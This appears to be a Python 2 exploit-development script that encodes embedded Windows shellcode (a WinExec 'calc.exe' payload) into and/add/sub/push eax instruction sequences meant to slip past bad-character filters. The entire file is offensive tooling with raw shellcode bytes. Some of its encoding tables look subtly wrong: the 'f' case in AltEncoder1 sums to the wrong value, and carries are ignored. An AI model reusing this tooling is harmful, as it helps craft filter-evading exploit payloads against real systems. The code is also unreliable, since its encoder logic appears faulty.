#!/usr/bin/python

import sys
import time

# This is an alternative encoder function if [01] is found
def AltEncoder1(item, FirstAdd, SecondAdd, ThirdAdd):
	for i in list(item):
		if i == '0':
			FirstAdd   += "1"
			SecondAdd  += "0"
			ThirdAdd   += "1"
		elif i == '1':
			FirstAdd   += "1"
			SecondAdd  += "1"
			ThirdAdd   += "1"
		elif i == '2':
			FirstAdd   += "1"
			SecondAdd  += "1"
			ThirdAdd   += "2"
		elif i == '3':
			FirstAdd   += "2"
			SecondAdd  += "2"
			ThirdAdd   += "1"
		elif i == '4':
			FirstAdd   += "2"
			SecondAdd  += "2"
			ThirdAdd   += "2"
		elif i == '5':
			FirstAdd   += "3"
			SecondAdd  += "2"
			ThirdAdd   += "2"
		elif i == '6':
                       	FirstAdd   += "3"
			SecondAdd  += "2"
			ThirdAdd   += "3"
		elif i == '7':
                     	FirstAdd   += "3"
			SecondAdd  += "3"
			ThirdAdd   += "3"
		elif i == '8':
                       	FirstAdd   += "4"
			SecondAdd  += "3"
			ThirdAdd   += "3"
		elif i == '9':
                       	FirstAdd   += "3"
			SecondAdd  += "4"
			ThirdAdd   += "4"
		elif i == 'a':
                       	FirstAdd   += "4"
			SecondAdd  += "4"
			ThirdAdd   += "4"
		elif i == 'b':
                       	FirstAdd   += "5"
			SecondAdd  += "5"
			ThirdAdd   += "3"
		elif i == 'c':
                       	FirstAdd   += "6"
			SecondAdd  += "5"
			ThirdAdd   += "3"
		elif i == 'd':
                       	FirstAdd   += "6"
			SecondAdd  += "5"
			ThirdAdd   += "4"
		elif i == 'e':
                       	FirstAdd   += "5"
			SecondAdd  += "5"
			ThirdAdd   += "6"
		elif i == 'f':
			FirstAdd   += "7"
    			SecondAdd  += "4"
			ThirdAdd   += "5"
	print 'and eax, 0x10101010'
	print 'and eax, 0x01010101'
	print 'add eax, 0x' + FirstAdd
	print 'add eax, 0x' + SecondAdd
	print 'add eax, 0x' + ThirdAdd
	print 'sub eax, 0x22222222'
	print 'push eax'

# This is an alternative encoder function if [f] is found
def AltEncoder2(item, FirstAdd, SecondAdd, ThirdAdd):
	for i in list(item):
		if i == '0':
			FirstAdd   += "0"
			SecondAdd  += "0"
			ThirdAdd   += "0"
		elif i == '1':
			FirstAdd   += "1"
			SecondAdd  += "0"
			ThirdAdd   += "0"
		elif i == '2':
			FirstAdd   += "1"
			SecondAdd  += "1"
			ThirdAdd   += "0"
		elif i == '3':
			FirstAdd   += "1"
			SecondAdd  += "1"
			ThirdAdd   += "1"
		elif i == '4':
			FirstAdd   += "2"
			SecondAdd  += "1"
			ThirdAdd   += "1"
		elif i == '5':
			FirstAdd   += "2"
			SecondAdd  += "2"
			ThirdAdd   += "1"
		elif i == '6':
                       	FirstAdd   += "2"
		 	SecondAdd  += "2"
			ThirdAdd   += "2"
		elif i == '7':
                      	FirstAdd   += "3"
			SecondAdd  += "3"
			ThirdAdd   += "1"
		elif i == '8':
                 	FirstAdd   += "4"
			SecondAdd  += "2"
			ThirdAdd   += "2"
		elif i == '9':
                       	FirstAdd   += "3"
			SecondAdd  += "3"
			ThirdAdd   += "3"
		elif i == 'a':
                        FirstAdd   += "4"
			SecondAdd  += "4"
			ThirdAdd   += "2"
		elif i == 'b':
                       	FirstAdd   += "5"
			SecondAdd  += "5"
			ThirdAdd   += "1"
		elif i == 'c':
                       	FirstAdd   += "6"
			SecondAdd  += "3"
			ThirdAdd   += "3"
		elif i == 'd':
                       	FirstAdd   += "6"
			SecondAdd  += "6"
			ThirdAdd   += "1"
		elif i == 'e':
                       	FirstAdd   += "5"
			SecondAdd  += "5"
			ThirdAdd   += "4"
		elif i == 'f':
			FirstAdd   += "7"
    			SecondAdd  += "7"
			ThirdAdd   += "1"
	print 'and eax, 0x10101010'
	print 'and eax, 0x01010101'
	print 'add eax, 0x' + FirstAdd
	print 'add eax, 0x' + SecondAdd
	print 'add eax, 0x' + ThirdAdd
	print 'push eax'

# This is default encoder function if none of 8 bytes chuncks have [f] or [01]
def DefaultEncoder(item, FirstAdd, SecondAdd):
	for i in list(item):
		if i == '0':
			FirstAdd   += "0"
			SecondAdd  += "0"
		elif i == '1':
			FirstAdd   += "1"
			SecondAdd  += "0"
		elif i == '2':
			FirstAdd   += "1"
			SecondAdd  += "1"
		elif i == '3':
			FirstAdd   += "2"
			SecondAdd  += "1"
		elif i == '4':
			FirstAdd   += "2"
			SecondAdd  += "2"
		elif i == '5':
		 	FirstAdd   += "3"
			SecondAdd  += "2"
		elif i == '6':
                    	FirstAdd   += "3"
			SecondAdd  += "3"
		elif i == '7':
                       	FirstAdd   += "3"
			SecondAdd  += "4"
		elif i == '8':
                       	FirstAdd   += "4"
			SecondAdd  += "4"
		elif i == '9':
                       	FirstAdd   += "5"
			SecondAdd  += "4"
		elif i == 'a':
                       	FirstAdd   += "5"
			SecondAdd  += "5"
		elif i == 'b':
                       	FirstAdd   += "6"
			SecondAdd  += "5"
		elif i == 'c':
                      	FirstAdd   += "6"
			SecondAdd  += "6"
		elif i == 'd':
                       	FirstAdd   += "7"
			SecondAdd  += "6"
		elif i == 'e':
                       	FirstAdd   += "7"
			SecondAdd  += "7"
	print 'and eax, 0x10101010'
	print 'and eax, 0x01010101'
	print 'add eax, 0x' + FirstAdd
	print 'add eax, 0x' + SecondAdd
	print 'push eax'

def main():

	# change shellcode here I used the following as an example, see the link https://www.exploit-db.com/exploits/44455/
	# 0:  33 c0                   xor    eax,eax           # zero out eax register
	# 2:  50                      push   eax               # push eax (null-byte) to terminate "calc.exe"
	# 3:  68 2E 65 78 65          push   ".exe"            # push the ASCII string to the stack
	# 8:  68 63 61 6C 63          push   "calc"            # 
	# d:  8b c4                   mov    eax,esp           # put the pointer to the ASCII string in eax
	# f:  6a 01                   push   0x1               # push uCmdShow parameter to the stack
	# 11: 50                      push   eax               # push the pointer to lpCmdLine to the stack
	# 12: bb 5d 2b 86 7c          mov    ebx,0x7c862b5d    # move the pointer to WinExec() [located at 0x7c862b5d in kernel32.dll (via arwin.exe) on WinXP SP3] into ebx
	# 17: ff d3                   call   ebx               # call WinExec()

	Shellcode = ("\x33\xc0\x50\x68\x2e\x65\x78\x65\x68\x63\x61\x6C\x63\x8b\xc4\x6a\x01\x50\xbb\x5d\x2b\x86\x7c\xff\xd3\x90\x90\x90")
	Shellcode = Shellcode[::-1]

	ShellcodeFormatted = ''
	for x in bytearray(Shellcode):
		ShellcodeFormatted += '%02x' %x
	
	ShellcodeFormatted = [ShellcodeFormatted[i:i+8] for i in range(0, len(ShellcodeFormatted), 8)]
	FirstAdd    = ""
	SecondAdd   = ""
	ThirdAdd    = ""

	W = '\033[0m'  # white
	R = '\033[31m' # red
	G = '\033[32m' # green
	O = '\033[33m' # orange

	for item in ShellcodeFormatted:
		print '[' +G+ '+' +W+ '] Encoding [%s]..' %item
		time.sleep(3)
		TwoBytes = [item[i:i+2] for i in range(0, len(item), 2)]
		# if this is true go to AltEncoder1
		if any(i == '01' for i in list(TwoBytes)):
			print '[' +R+ '!' +W+'] [' +O+ '01' +W+ '] found in shellcode, using alterantive encoder..'
			time.sleep(3)
			AltEncoder1(item, FirstAdd, SecondAdd, ThirdAdd)
		# if this is true go to AltEncoder2
		elif any(i == 'f' for i in list(item)):
			print '[' +R+ '!' +W+ '] [' +O+ 'f' +W+ '] found in shellcode, using alterantive encoder..'
			time.sleep(3)
			AltEncoder2(item, FirstAdd, SecondAdd, ThirdAdd)
		# if this is true go to DefaultEncoder
		else:
			print '[' +G+ '+' +W+ '] [' +O+ 'f' +W+ '] and [' +O+ '01' +W+ '] not found, using default encoder..'
			time.sleep(3)
			DefaultEncoder(item, FirstAdd, SecondAdd)

if __name__ == '__main__':
	main()
